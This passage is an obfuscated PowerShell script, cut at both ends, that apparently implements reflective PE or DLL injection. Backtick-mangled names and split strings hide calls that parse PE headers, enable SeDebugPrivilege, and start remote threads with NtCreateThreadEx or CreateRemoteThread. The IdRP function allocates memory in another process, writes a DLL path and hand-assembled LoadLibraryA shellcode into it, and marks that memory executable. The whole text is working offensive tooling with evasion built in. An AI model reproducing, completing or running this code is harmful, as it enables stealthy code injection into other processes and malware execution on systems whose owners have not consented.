            if ( ${V`1B}."Cou`Nt" -eq ${V`2B}."cO`UNt"  ) {
                ${co} = 0
                for (${i} =   0 ;   ${I} -lt ${V`1B}."Cou`NT"  ; ${I}++  ) {
                    ${V`Al}   = ${V`1B}[${i}] - ${c`o}
					
                    if (  ${v`AL} -lt ${V`2b}[${I}]  ) {
                        ${V`Al} += 256
                        ${C`O}  = 1
                    }
                    else {
                        ${c`O}  =   0
                    }
				
				
                    [UInt16]${S`Um}  =  ${v`AL} - ${v`2b}[${i}]

                    ${FB}[${i}]   =  ${s`Um} -band 0x00FF
                }
            }
            else {
                Throw ""
            }
		
            return [BitConverter]::"TOin`T64"( ${f`B}, 0)
        }
	

        Function aSiaU {
            Param(
                [Parameter(poSITIon  = 0, maNdAtoRY  =   ${T`RUe})]
                [Int64]
                ${V1},
		
                [Parameter(poSItioN =  1, MAnDATOrY  =  ${TR`Ue}  )]
                [Int64]
                ${v2}
            )
		
            [Byte[]]${v`1B}   =  [BitConverter]::"g`EtBy`Tes"( ${V`1})
            [Byte[]]${v`2b}   =  [BitConverter]::"GetbY`TES"( ${v2})
            [Byte[]]${Fb}  = [BitConverter]::"Get`BY`Tes"([UInt64]0  )

            if (${V`1B}."CO`UnT" -eq ${v`2b}."cO`UnT"  ) {
                ${C`o}  =   0
                for (  ${i} =   0 ;  ${i} -lt ${V`1b}."cO`UnT" ;  ${i}++  ) {
					
                    [UInt16]${s`Um}  = ${V`1B}[${I}]  +  ${V`2b}[${i}]  +  ${C`O}

                    ${Fb}[${I}] =  ${s`UM} -band 0x00FF
				
                    if (  (  ${s`UM} -band 0xFF00 ) -eq 0x100) {
                        ${C`O}  = 1
                    }
                    else {
                        ${CO}   =   0
                    }
                }
            }
            else {
                Throw ""
            }
		
            return [BitConverter]::"To`iNt64"( ${FB}, 0  )
        }
	

        Function CV1GTv2Au {
            Param(  
                [Parameter(  pOSITiOn = 0, mANdatOrY   = ${tr`Ue})]
                [Int64]
                ${v1},
		
                [Parameter(posiTIon   =  1, maNDatoRy   = ${Tr`UE} )]
                [Int64]
                ${V2}
              )
		
            [Byte[]]${V`1b}  =   [BitConverter]::"g`ETBYt`eS"( ${V1}  )
            [Byte[]]${v`2B}  =   [BitConverter]::"G`E`TbYTEs"(  ${v`2})

            if ( ${V`1b}."C`ouNt" -eq ${V`2b}."c`ounT"  ) {
                for (  ${i}   = ${v`1b}."CoU`Nt" - 1 ; ${I} -ge 0 ; ${i}--) {
                    if (${v`1b}[${I}] -gt ${v`2B}[${i}]) {
                        return ${Tr`UE}
                    }
                    elseif (${v`1b}[${i}] -lt ${V`2B}[${i}] ) {
                        return ${Fal`Se}
                    }
                }
            }
            else {
                Throw ""
            }
		
            return ${FA`L`sE}
        }
	

        Function coNVert-UiNttOiNT {
            Param(  
                [Parameter(  POsition = 0, mandATORy   =  ${T`Rue})]
                [UInt64]
                ${V`AL`UE}
            )
		
            [Byte[]]${v`BSA} =  [BitConverter]::"G`e`TbyTES"(  ${v`A`lUe} )
            return (  [BitConverter]::"tOINt`64"( ${vb`sa}, 0 )  )
        }
	
	
        Function TmRv {
            Param(
                [Parameter(POsITioN   = 0, MANDAtORy   =   ${TR`Ue}  )]
                [String]
                ${D`eBuGSt`Ri`NG},
		
                [Parameter(posITioN  =  1, ManDatOry  =  ${Tr`UE})]
                [System.Object]
                ${p`EI},
		
                [Parameter( pOSItION  =  2, maNDaTORY   =  ${TR`Ue}  )]
                [IntPtr]
                ${sa`Y`S1},
		
                [Parameter(PARAMeTERseTnAMe =  "S`iZE", pOSITion   =  3, maNDatoRy  =  ${t`RUE})]
                [IntPtr]
                ${SI`Ze}
              )
		
            [IntPtr]${f`Ea} =   [IntPtr](  ASIAU ( ${say`S1}) ( ${sI`Ze} )  )
		
            ${PEenDADd`R`E`Ss}   =  ${p`ei}."En`DADdr`ESS"
		
            if (  (CV1GTV2AU (${P`Ei}."Peh`A`NDLe" ) (  ${sa`Y`S1} )  ) -eq ${Tr`Ue}  ) {
                Throw ""
            }
            if ((  CV1GTV2AU (  ${f`ea}) (${peENDAdD`Re`Ss} )  ) -eq ${T`Rue}) {
                Throw ""
            }
        }
	
	
        Function wBTM {
            Param(  
                [Parameter( POsitIon  =   0, ManDaTory   =   ${T`RuE}  )]
                [Byte[]]
                ${B`yTes},
			
                [Parameter(pOSITiON   =   1, mandatOry = ${t`RuE})]
                [IntPtr]
                ${mA`DS}
             )
	
            for (  ${OF`sT}  = 0  ;  ${o`FsT} -lt ${By`TeS}."lEN`gTH" ;   ${Of`sT}++) {
                [System.Runtime.InteropServices.Marshal]::"W`RITeBY`TE"(  ${M`ADs}, ${O`FSt}, ${By`TES}[${Of`St}]  )
            }
        }
	

		
        Function GTDp {
            Param
            (
                [OutputType(  [Type]  )]
	        
                [Parameter(   poSiTioN   =  0)]
                [Type[]]
                ${pA`R`AMe`TERS} =  ( nO typE[]( 0 ) ),
	        
                [Parameter( pOsiTIon  =   1   )]
                [Type]
                ${re`TUR`NTy`pe}  =   [Void]
              )

            ${D`omaIn}   =  [AppDomain]::"Cu`RReNtdOM`AIn"
            ${dYNAs`Semb`lY}   =  nO ReFLEctION.ASseMBLynamE(  'Re'+  'f'+'le' +'ct' +  'ed' + 'De'+'le'+( 'ga'+ 't' ) +  'e'  )
            ${l`onsH}  =  ${DomA`in}."DEFin`EdYn`A`miC`A`sSe`Mbly"(  ${Dy`NA`SSEM`BlY}, [System.Reflection.Emit.AssemblyBuilderAccess]::"r`UN")
            ${m`BEr}  =  ${LOn`sH}."deFIn`e`DYnAm`i`cModuLE"(('I'+'nM' +'emoryMod'  + 'ule' ), ${FA`L`se} )
            ${TB}   =   ${MB`eR}."D`eFin`EtypE"( ('M'  + 'y'  + 'DelegateTy' +'pe'), ('C' + 'l'  +  'ass'  +  ', Pub' +  'lic, '+  'S'+ 'ealed' +',' + ' Ans'+  'iC'  +  'las' +  's, A'+'utoClass'), [System.MulticastDelegate] )
            ${c`BEr} =   ${TB}."DEfI`NEConsTr`UC`Tor"(  ( 'RT'  +  'S'  + 'peci'+  'alName, Hi'+ 'deBySig, Pub'+ 'li'+ 'c'  ), [System.Reflection.CallingConventions]::"ST`A`NDARd", ${paRAmE`TE`RS} )
            ${c`BER}."seTiM`plEMen`TATION`FlA`gS"(  (  'Runt' +  'ime, Ma'+ 'nage'  +'d'  ) )
            ${MB`ER1} =  ${t`B}."dEF`IN`emET`Hod"(  'Invoke', ( 'P'  +  'u'  +'blic,' + ' HideBySig, N'+'ewSlot, ' +  'Virtua' + 'l' ), ${ReTu`R`NTYPe}, ${pA`RAMe`TErs}  )
            ${m`Be`R1}."SEt`iMpl`Eme`NtA`TIO`NFLags"((  'Ru'  + 'n'  +  'time,'+  ' Mana' +  'ged'  )  )
	    
            Write-Output ${tB}."Cr`ea`TEtYPE"(   )
        }

		
        Function get-pAD {
            Param
            ( 
                [OutputType([IntPtr] )]
	    
                [Parameter(   POSItIOn   =   0, MandatOrY   =   ${TR`UE} )]
                [String]
                ${M`oDU`le},
	        
                [Parameter(  pOSITION  =  1, MANDaTory   =   ${tr`UE}  )]
                [String]
                ${proce`dU`Re}
             )

			
            ${SySt`eMASsem`BLy}   =   [AppDomain]::"c`URrEN`TDOM`Ain"."GetaS`SEMb`LI`Es"(  ) |
            Where-Object { ${_}."G`l`Obal`ASSe`mb`ly`cAChE" -And ${_}."LOCA`TION"."Sp`liT"(  ( ('hQ0' +'hQ0' )."rEPl`ACE"('hQ0','\') )  )[-1]."equ`Als"( ( 'Sys'  +  'tem'  +'.'+'dll'  )) }
            ${u`Nm}  =   ${S`YSTeMA`Ss`EmBLy}."Getty`pe"((  'Microsoft'+'.Win32' +  '.UnsafeN'  +'ati'+'v'+  'eMeth'+  'ods')  )
            ${jF`N`_fj} =  ${U`Nm}."ge`TME`ThOd"(( 'GetM'  + 'oduleHand'  +  'l'  +'e'  ) )
            ${G`Pa} =  ${U`Nm}."g`eTmeTH`od"(  ( 'GetP'+'rocAddr'  +  'ess'  ), [Type[]]@([System.Runtime.InteropServices.HandleRef], [String] ) )
            ${32`hK}   =   ${J`FN_fJ}."In`VOkE"(${n`ULL}, @(${modU`le} ))
            ${T`m`ppTR}   = nO INTptr
            ${HANd`L`Eref}   =  nO SYSTEm.RUNTimE.InTERoPseRvIcES.HandlereF( ${t`m`pPTr}, ${32`hK} )

			
            Write-Output ${G`Pa}."invo`KE"( ${nU`Ll}, @([System.Runtime.InteropServices.HandleRef]${hanD`ler`eF}, ${PRoc`ED`Ure}))
        }
	
	
        Function enSeDP {
            Param(  
                [Parameter(  POSitioN  =  1, MandAtOry  =   ${T`RUE} )]
                [System.Object]
                ${w3`2F},
		
                [Parameter(  poSiTIOn  =  2, MaNdATORY =  ${tr`UE})]
                [System.Object]
                ${W`32t},
		
                [Parameter(  pOsITioN = 3, MaNDaTory =   ${Tr`Ue})]
                [System.Object]
                ${w`32c}
             )
		
            [IntPtr]${ThreD`H`And} =   ${w`32F}."gET`CUR`RE`NtTh`ReAD"."I`NvO`ke"(  )
            if (${T`Hr`e`dHaND} -eq [IntPtr]::"zE`Ro" ) {
                Throw ""
            }
		
            [IntPtr]${thrEd`To`kEIN}  = [IntPtr]::"Z`ero"
            [Bool]${rEs`U`LT}  =  ${w3`2F}."ope`NtHrE`AdT`OKen"."InVO`kE"(${t`hrE`dH`AnD}, ${w3`2c}."tO`K`en_que`RY" -bor ${W3`2C}."ToK`e`N_aDJUST`_PrI`ViLeG`ES", ${f`AlSe}, [Ref]${TH`ReDT`OkeIN}  )
            if (  ${RE`sULT} -eq ${Fa`LSE} ) {
                ${E`R`R`OrCodE} =   [System.Runtime.InteropServices.Marshal]::"g`etlASt`wiN32eR`Ror"()
                if ( ${Er`RorcO`De} -eq ${w3`2C}."eR`ROR`_n`O_`ToKEn"  ) {
                    ${R`E`sULT}   =   ${w3`2f}."ImpERsO`Na`T`esE`Lf"."I`NvoKe"(  3)
                    if ( ${R`eSuLt} -eq ${fAL`SE}  ) {
                        throw ""
                    }
				
                    ${rES`U`lt} =   ${W3`2F}."openTh`Re`AdT`o`ken"."INVO`ke"(${tH`Re`DHa`Nd}, ${w3`2c}."tO`KEN_Qu`E`RY" -bor ${w`32C}."tOKeN_adjU`St_`prIVil`Eges", ${fAL`se}, [Ref]${T`Hr`EDt`OkEin}  )
                    if (${rEsU`lT} -eq ${f`ALse}  ) {
                        throw ""
                    }
                }
                else {
                    throw ""
                }
            }
		
            [IntPtr]${PLU`iD}  =   [System.Runtime.InteropServices.Marshal]::"AlL`oC`hG`loBal"(  [System.Runtime.InteropServices.Marshal]::"siZ`EOF"(  [Type]${w3`2T}."Lu`iD") )
            ${r`ESu`Lt}  =   ${W`32f}."lo`oKupPrIVIL`Ege`VA`lUe"."invo`ke"( ${n`UlL}, ( 'S'  + 'eDebu'  + 'gPriv' +  'ile' +  'ge'), ${PLu`ID}  )
            if (  ${r`eSU`Lt} -eq ${fal`Se}  ) {
                throw ""
            }

            [UInt32]${tP`AS} = [System.Runtime.InteropServices.Marshal]::"s`IzE`oF"( [Type]${W3`2t}."t`Ok`eN`_PrIV`ilEges" )
            [IntPtr]${T`PSMEm}   =   [System.Runtime.InteropServices.Marshal]::"a`l`LOCHGLo`BAl"(  ${t`PAs}  )
            ${T`Ps}  = [System.Runtime.InteropServices.Marshal]::"ptRt`OStRUc`Ture"(  ${tP`SmEm}, [Type]${W3`2t}."TOK`e`N_pR`I`VILEGEs" )
            ${T`pS}."p`Ri`VILeGE`c`Ount" =  1
            ${t`PS}."PrIv`ILe`geS"."lu`id"   =   [System.Runtime.InteropServices.Marshal]::"PT`R`TOSTRU`CTU`RE"(${plu`ID}, [Type]${w3`2t}."l`UId"  )
            ${t`PS}."P`RI`VILE`gES"."AtTRI`Bu`TES"   =   ${w`32C}."Se`_pR`ivI`LEgE_eNABlED"
            [System.Runtime.InteropServices.Marshal]::"S`TrUCtU`RE`T`optR"( ${T`ps}, ${TpsM`Em}, ${tR`Ue}  )

            ${res`U`Lt}  =  ${W3`2F}."AdJUStT`Ok`EnP`R`ivilE`GEs"."IN`V`OKe"(  ${T`hrE`Dt`OkeiN}, ${F`AlsE}, ${tP`Sm`Em}, ${T`PAs}, [IntPtr]::"ze`Ro", [IntPtr]::"zE`Ro" )
            ${E`RROr`CODE}  =   [System.Runtime.InteropServices.Marshal]::"G`eTlAS`T`WIn32e`RrOR"(   ) 
            if (( ${r`es`ULT} -eq ${fAL`SE} ) -or ( ${e`R`RoRCoDE} -ne 0)) {
				
            }
		
            [System.Runtime.InteropServices.Marshal]::"f`RE`e`hGlObaL"(${TP`sM`EM} )
        }
	
	
        Function iCRt {
            Param(
                [Parameter(  pOSitION  = 1, manDAtORy =   ${t`RUe}  )]
                [IntPtr]
                ${pR`OLEv},
		
                [Parameter(  posItioN  = 2, manDaTORY   =  ${t`RUE}  )]
                [IntPtr]
                ${S`A`YS1},
		
                [Parameter(POsItIOn  =   3, mandaTorY =  ${fa`LsE})]
                [IntPtr]
                ${K`F`Ndhg} =   [IntPtr]::"ze`Ro",
		
                [Parameter(poSITIon  = 4, maNDaTORy   =  ${t`RUE}  )]
                [System.Object]
                ${w`32F}
              )
		
            [IntPtr]${rT`HA1}   =  [IntPtr]::"Ze`RO"
		
            ${oSvE`R`SI`on}   =  [Environment]::"o`SVe`RsiON"."V`er`SiOn"
			
            if (( ${os`VEr`SION} -ge (  nO ( 'V'+ 'ersion') 6, 0) ) -and (${o`sv`ErSiOn} -lt (  nO ( 'Vers'+ 'i'+'on'  ) 6, 2)) ) {
 
                ${r`E`TVaL}   = ${W3`2F}."NTCReaTe`T`hre`Adex"."inv`O`Ke"([Ref]${R`T`Ha1}, 0x1FFFFF, [IntPtr]::"Z`ERO", ${p`RoLEV}, ${SA`yS1}, ${KF`NDhg}, ${FA`LSe}, 0, 0xffff, 0xffff, [IntPtr]::"zE`RO" )
                ${L`Aster`ROr}  =   [System.Runtime.InteropServices.Marshal]::"GeTl`A`STWin3`2eRr`Or"( )
                if (  ${R`THA1} -eq [IntPtr]::"Ze`RO"  ) {
                    throw ""
                }
            }
			
            else {
                ${RTH`A1}  = ${w3`2F}."CrE`AtERE`mot`eTHREaD"."inv`oKE"(  ${pr`Ol`eV}, [IntPtr]::"Ze`RO", [UIntPtr][UInt64]0xFFFF, ${S`AY`s1}, ${Kf`NDhG}, 0, [IntPtr]::"zE`RO"  )
            }
		
            return ${RT`hA1}
        }

	

        Function GinHS {
            Param(
                [Parameter(  PosiTioN =   0, mANdaTorY   =   ${tR`Ue})]
                [IntPtr]
                ${p`EH},
		
                [Parameter(  poSITioN =  1, mANDATory  =   ${t`RuE}  )]
                [System.Object]
                ${W3`2T}
              )
		
            ${In`TH2`iD}  = nO SYstEm.OBJect
		
			
            ${d`OsHE`AdER}  =   [System.Runtime.InteropServices.Marshal]::"pt`RTos`TrUcture"(  ${P`eh}, [Type]${w3`2T}."i`MAG`e_dOS_`H`EAdeR")

			
            [IntPtr]${ntHe`AdE`RSp`TR} = [IntPtr](ASIAU (  [Int64]${p`Eh}  ) ([Int64][UInt64]${dOsH`eA`DEr}."e_`LF`ANeW"  )  )
            ${i`N`Th2Id}  |  aM -MemberType $('No'+'te'+  'P' +  'r' +'op'  + 'e' +'r' +  'ty') -Name ntHEadErspTr -Value ${NtHeADErs`P`TR}
            ${I`N`TH6} = [System.Runtime.InteropServices.Marshal]::"PTr`To`STrUCtU`Re"( ${nth`ead`e`R`spTr}, [Type]${W`32T}."iMAG`e_`NT_hEAdE`RS`64" )
		
			
            if ( ${I`Nt`h6}."s`iGnaTU`Re" -ne 0x00004550  ) {
                throw ""
            }
		
            if (${INT`h6}."OPt`ionAlh`Ead`er"."maG`Ic" -eq (  'IMAGE_NT'+  '_OPTIO' +  'NAL' +'_H' +  'DR6'  + '4_'+'MA'+  'G' +'IC')) {
                ${IN`Th2`id} |  aM -MemberType $('No'  +'te'  +'P'+  'r'  +'op'+  'e'+ 'r'  +  'ty'  ) -Name $('IM' +'AG' +  'E_'+ 'NT'  +  '_' +'HE' + 'AD'+  'ER' +  'S' ) -Value ${int`H6}
                ${I`N`Th2ID}   | aM -MemberType $('No' +  'te'  + 'P'  + 'r' +  'op'  +'e' +  'r'  +  'ty'  ) -Name $('PE'+'64'  +'Bi'+'t'  ) -Value ${TR`Ue}
            }
            else {
                ${inT`h2}   =   [System.Runtime.InteropServices.Marshal]::"p`TRTostRU`cturE"( ${Nthea`d`erSpTR}, [Type]${w`32T}."ImaG`e_N`T_hE`AdE`Rs32"  )
                ${i`Nth2iD} |  aM -MemberType $('No'+ 'te' +'P'+ 'r'  + 'op'  +'e' +  'r' + 'ty' ) -Name $('IM' +'AG'+ 'E_' +  'NT'  +'_'+  'HE'+  'AD' +'ER'  +'S' ) -Value ${IN`Th2}
                ${I`N`Th2iD}  |  aM -MemberType $('No'+  'te'  +'P' + 'r'  +'op' +'e' +  'r'+'ty') -Name $('PE'  +'64'+'Bi'+'t' ) -Value ${faL`SE}
            }
		
            return ${INTh`2iD}
        }


		
        Function gpBi {
            Param(  
                [Parameter(  POsITiON = 0, MANDaToRy   = ${tR`Ue}  )]
                [Byte[]]
                ${P`Neb`ITES},
		
                [Parameter(pOSItION  =   1, MAnDAtOrY   = ${Tr`UE})]
                [System.Object]
                ${w3`2t}
             )
		
            ${p`eI}  =  nO SySTEM.oBJEct
		
			
            [IntPtr]${UP`eB}  = [System.Runtime.InteropServices.Marshal]::"a`LLOchgL`obaL"(  ${PNeB`i`TEs}."Le`Ng`Th"  )
            [System.Runtime.InteropServices.Marshal]::"C`OPY"(  ${Pn`EbiT`Es}, 0, ${Up`eB}, ${p`NEBIT`eS}."LENg`TH") > ${n`ULL}
		
			
            ${iNtH2`Id} =   GINHS -PEH ${u`peB} -W32T ${W`32t}
		
			
            ${p`EI}   |   aM -MemberType $('No'+ 'te'+'P'+  'r' +  'op'  +  'e' +'r'  +'ty' ) -Name $('PE'  +  '64' +'Bi' + 't'  ) -Value ( ${i`NTH2`iD}."pe`64BiT")
            ${p`eI}  | aM -MemberType $('No'+ 'te'+ 'P' +  'r'+ 'op'  + 'e' +  'r'+  'ty') -Name $('Or' + (  'i' +'gi' )  + (  'na'+  'l'  )+  ( 'I'+'ma' )  + 'ge'+ ('Ba' +  's' ) +  'e') -Value ( ${I`N`TH2ID}."ImA`gE`_`NT_HEa`dErs"."op`Ti`onAlhEa`dER"."I`MAgE`BasE")
            ${P`EI}  |  aM -MemberType $('No' +'te'  +'P' + 'r' + 'op'  + 'e'+  'r' + 'ty'  ) -Name $('Si'+  'ze'  + 'Of'  +'Im' +'ag'  +'e'  ) -Value ( ${i`Nth2`Id}."IMAgE_nt_he`AdE`RS"."opTIonalh`E`A`d`ER"."s`iz`eofImAGe"  )
            ${P`EI}  | aM -MemberType $('No'  +'te' +'P'+ 'r' +'op'  +  'e' +  'r'  +  'ty'  ) -Name $('Si' + 'ze'  + 'Of' +'He' + 'ad'  +'er' +  's'  ) -Value (  ${in`TH2`ID}."i`Ma`Ge_Nt_`HEadErS"."OptIo`Na`lhE`AdER"."Siz`E`o`FHeADeRs" )
            ${p`EI}   | aM -MemberType $('No'+'te' +  'P' +'r'+ 'op'+ 'e'+  'r'  +'ty' ) -Name $('DL'+  'LC' +  'ha' +  'ra'+ 'ct'  +'er' + 'is'+'ti'  + 'cs') -Value ( ${iN`Th2`iD}."im`A`ge`_nT`_`HEAdeRs"."OpTi`onalh`Ea`D`eR"."dLlchAracT`ER`IsT`iCS"  )
		
			
            [System.Runtime.InteropServices.Marshal]::"FRee`hG`l`obaL"( ${u`PEB}  )
		
            return ${P`eI}
        }


Function gPbID {
    Param( 
        [Parameter( poSITIon  =   0, MaNDaTORY  = ${Tr`Ue})]
        [IntPtr]${p`eh},

        [Parameter( pOsItIOn =  1, ManDAToRY  =  ${T`RuE}  )]
        [System.Object]${W3`2t},

        [Parameter(pOsitioN   =  2, mANDATOrY   =  ${tR`Ue}  )]
        [System.Object]${w`32C}
     )

    if ( ${P`eh} -eq ${nU`ll} -or ${P`EH} -eq [IntPtr]::"ze`Ro"  ) {
        throw ( 'PE Handle' + ' is n' +  'u'+  'll or zer' + 'o.'  )
    }

    ${p`EI} =  nO SYsteM.ObjEcT

    ${InTH`2`ID}   =   GINHS -PEH ${p`Eh} -W32T ${W`32T}

${P`eI} |  Add-Member -MemberType $('No'+ 'te' +'P'+ 'r'+  'op'+  'e'+ 'r' +  'ty') -Name $((  'PE' +  'Ha') +(  'nd'  +'l')+ 'e' ) -Value $(${P`Eh} )
${p`eI}   |   Add-Member -MemberType $('No'+ 'te'  +'P' + 'r'  +'op' +  'e'  + 'r'  + 'ty') -Name $('IM'+  'AG'+  'E_'  +  'NT'+ '_'+'HE' +'AD'+'ER' +'S') -Value $(${in`Th`2Id}."i`maGe_`N`T_Hea`DERs"  )
${p`EI}   |   Add-Member -MemberType $('No' +  'te'  +  'P'  + 'r'  + 'op' +'e'  +'r' +  'ty' ) -Name $('Nt' + 'He' +  'ad'  +  'er'+ (  'sP'  +  't')+'r') -Value $(${iNt`h`2iD}."NT`HE`A`dERspTr")
${P`ei}  |  Add-Member -MemberType $('No'+ 'te'  +  'P' +  'r'  +  'op' + 'e'+'r'+  'ty' ) -Name $('PE'+ '64'  +  'Bi' +'t') -Value $(${Int`H2`iD}."PE64`BIt"  )
${P`EI}  |  Add-Member -MemberType $('No' + 'te'+ 'P'+  'r'  + 'op'  +'e'  +  'r'  +'ty') -Name $('Si' +'ze'+  'Of'  + 'Im'  +'ag'+  'e') -Value $(${IN`TH2id}."iMA`GE_nT_`Hea`DerS"."oPt`IONalhEa`der"."si`z`EOfiMaGe"  )


    if (  ${p`eI}."pe`64`BIt" -eq ${T`RUe}  ) {
        [IntPtr]${Shed`e`RP`TR} =  [IntPtr]( ASIAU ([Int64]${P`eI}."NtHEaDE`RS`P`Tr") (  [System.Runtime.InteropServices.Marshal]::"Si`ze`OF"(  [Type]${w3`2T}."ImA`Ge_Nt`_`HEadER`s64")))
        ${p`EI} |  aM -MemberType $('No' +  'te' + 'P' +'r'+ 'op' +  'e'+ 'r'+'ty') -Name $('Se'+  'ct'  +'io'+  'nH'  +  'ea'  +  'de' + 'rP' +  'tr') -Value ${Sh`eDerP`Tr}
    } else {
        [IntPtr]${sHe`d`ERpTR} = [IntPtr]( ASIAU ( [Int64]${P`EI}."NtHeAde`Rs`pTR") (  [System.Runtime.InteropServices.Marshal]::"S`IZeOF"(  [Type]${W3`2t}."i`MAgE_N`T`_HEADErS32" ) ) )
        ${P`Ei}   |   aM -MemberType $('No' +  'te' +'P'  + 'r'+'op'+  'e'+ 'r'  +'ty') -Name $('Se'+'ct' +  'io'  + 'nH' +  'ea'  +  'de' +'rP' +'tr'  ) -Value ${sH`EdER`P`Tr}
    }

    if ( (  ${INt`h`2iD}."I`m`Age_`N`T_heA`Ders"."F`ILEHE`ADer"."cHaRac`TER`I`SticS" -band ${w3`2c}."IMAGe_fiL`e_d`Ll") -eq ${W3`2c}."i`mA`ge_fil`E`_dlL" ) {
        ${p`ei}  | aM -MemberType $('No' + 'te'  +'P'+'r'  + 'op'+  'e'  +  'r' + 'ty' ) -Name $('Fi'  +'le'  +  'Ty' + 'pe'  ) -Value ( 'D'  +'LL')
    } elseif (  (${INt`H2ID}."iMA`Ge_NT`_heaDERs"."f`iLehE`AdER"."C`H`AR`AcTERI`STicS" -band ${W`32c}."iM`A`ge_Fi`l`E_ExecutaB`lE_`iMA`gE"  ) -eq ${w3`2c}."Ima`GE_FI`Le_ExeCutaBle_`I`mAgE" ) {
        ${p`EI} |   aM -MemberType $('No'+'te' + 'P' +'r'  + 'op' + 'e'  + 'r' +'ty' ) -Name $('Fi'+'le' + 'Ty'+'pe'  ) -Value ('E'  +'XE')
    } else {
        throw ""
    }

    return ${P`ei}
}

	
	
        Function IdRP {
            Param(  
                [Parameter(  poSItION =  0, MANDatORy   =   ${tR`Ue}  )]
                [IntPtr]
                ${r`ph},
		
                [Parameter(  PositIoN =   1, mandaToRy  =   ${Tr`Ue} )]
                [IntPtr]
                ${IP`Ams`PTR}
             )
		
            ${P`OIN`TER`sZ}   = [System.Runtime.InteropServices.Marshal]::"S`iZEof"(  [Type][IntPtr])
		
            ${Ip`A`MS}   = [System.Runtime.InteropServices.Marshal]::"pTRtosT`RInG`ANSi"(  ${IPA`m`S`PtR}  )
            ${dl`Pz}   =  [UIntPtr][UInt64]([UInt64]${I`pa`Ms}."L`EnGtH" +  1)
            ${RIMPo`RT`DllP`ATHP`Tr}  =   ${w`32F}."vIR`TuaLaLlo`CEX"."I`N`VokE"(${R`pH}, [IntPtr]::"ze`Ro", ${Dl`pz}, ${W`32c}."mEm_`COm`MIT" -bor ${W`32c}."ME`M`_`RESErVe", ${W`32c}."P`AgE`_REa`DWr`ItE" )
            if (${Rim`PoRTdLLp`ATH`PTr} -eq [IntPtr]::"z`eRO" ) {
                throw ""
            }

            [UIntPtr]${n`Bw}  = [UIntPtr]::"z`eRO"
            ${suc`c`esS}  = ${W`32f}."WrIt`EPRoCES`s`mEMOrY"."iN`VOke"(  ${r`pH}, ${RimPo`Rt`DLL`PAt`hptR}, ${i`paMSP`TR}, ${Dl`pZ}, [Ref]${n`BW}  )
		
            if (  ${sucCE`ss} -eq ${fA`lse} ) {
                throw ""
            }
            if (  ${D`LPZ} -ne ${n`Bw} ) {
                throw ""
            }
		
            ${K`32h}  = ${W3`2f}."gE`T`mOduLE`ha`NdlE"."inVo`Ke"(  ('k'  +'erne'  +  'l3' +  '2.dll'  ))
            ${L`OA`dLiBRa`RyA`AdDR}  = ${W`32f}."gE`TPRoC`AdDResS"."iNV`o`kE"(${k`32H}, ('LoadLib'+'r' +'a' +'ryA'  )  ) 
		
            [IntPtr]${dLL`ADdr`e`ss}  = [IntPtr]::"z`eRO"
			
			
            if (  ${p`eI}."P`E64`BIt" -eq ${tR`UE}) {
				
                ${lOad`LibRa`RYARE`T`M`eM}   =   ${W`32f}."ViR`TUaL`AL`l`OCex"."i`Nv`Oke"(${R`pH}, [IntPtr]::"Ze`Ro", ${DL`PZ}, ${W`32c}."Me`m_`COMMiT" -bor ${w`32c}."M`e`m_R`esErVe", ${W3`2c}."PAge_`R`eadWri`TE" )
                if ( ${LO`Ad`libRA`R`yAret`Mem} -eq [IntPtr]::"Z`Ero" ) {
                    throw ""
                }
			
			
				
                ${L`oaDL`iBRARy`Sc1}  =   @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9  )
                ${l`oAD`LIbra`RY`sC2}   = @(0x48, 0xba  )
                ${L`O`ADl`IbRARys`c3} =   @(0xff, 0xd2, 0x48, 0xba)
                ${lo`AdL`IBrary`sc4} =   @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3  )
			
                ${s`C`LeNGtH} = ${LOaD`lI`BRar`Ysc1}."Le`Ngth" +   ${LoADLiBRAR`Y`S`c2}."L`enGtH"  + ${lo`ADLibRA`Rys`C3}."LEN`gTH"  +  ${Load`LI`BRaR`ysc4}."Le`NGth" +   (${POIn`T`Ersz} * 3  )
                ${sm}  =  [System.Runtime.InteropServices.Marshal]::"all`ocH`GL`obAl"(${S`c`LeNg`TH} )
                ${s`M`Orig`InAl}  =   ${S`m}
			
                WBTM -Bytes ${LO`AdLiB`R`Ar`ysC1} -MADS ${s`M}
                ${sm}  =   ASIAU ${S`M} (  ${lOAD`l`i`B`RarySc1}."L`ENgTH" )
                [System.Runtime.InteropServices.Marshal]::"struCT`U`REToPtR"( ${RIM`pORtdLL`p`ATHptR}, ${SM}, ${fa`lSe})
                ${S`M}   = ASIAU ${S`M} (  ${poI`Nte`RSz} )
                WBTM -Bytes ${lo`ADlIB`Rar`ySC2} -MADS ${s`M}
                ${s`M} = ASIAU ${S`M} (${lOadl`IBRAr`Y`sC2}."L`eN`gth"  )
                [System.Runtime.InteropServices.Marshal]::"S`TRUcT`UretOptr"( ${LOAD`LiBra`RYa`A`d`Dr}, ${SM}, ${fAl`se}  )
                ${sM}  =   ASIAU ${sM} (${pOi`N`TErSz} )
                WBTM -Bytes ${l`oA`DlIbr`ARYSc3} -MADS ${SM}
                ${sM} = ASIAU ${S`m} (  ${lOADL`iBr`AryS`C3}."l`eNg`TH" )
                [System.Runtime.InteropServices.Marshal]::"s`T`RU`cTurE`TOPTr"(  ${Lo`ADlIbraryar`eT`MEm}, ${sM}, ${f`ALse} )
                ${S`m} =   ASIAU ${s`m} (${pOI`NtER`sZ} )
                WBTM -Bytes ${LoADLi`Bra`RY`Sc4} -MADS ${sm}
                ${sM}  =   ASIAU ${s`M} (${L`oA`Dl`ibRARYsc4}."LenG`Th" )

			
                ${r`Sc`ADdr}   = ${w3`2F}."VI`RT`UaLa`LlOCEX"."IN`VoKE"( ${R`PH}, [IntPtr]::"Z`ERO", [UIntPtr][UInt64]${sc`l`eN`GtH}, ${W`32c}."MEM_c`O`Mm`iT" -bor ${W`32C}."MEm_`RE`sERVE", ${w`32c}."pA`Ge_ExEC`U`Te_REA`DwriTe")
                if (${RSc`AD`DR} -eq [IntPtr]::"Ze`Ro" ) {
                    throw ""
                }
			
                ${s`U`cCESs}  =  ${w`32f}."w`RITePr`OCeSsmEM`O`Ry"."IN`VokE"(  ${R`PH}, ${RsCAd`DR}, ${Sm`Or`iGI`NaL}, [UIntPtr][UInt64]${s`CL`eNgtH}, [Ref]${n`Bw})
                if ((  ${sUC`C`EsS} -eq ${F`AL`sE}) -or ([UInt64]${N`BW} -ne [UInt64]${sC`Le`NGTH} )) {
                    throw ""
                }
			
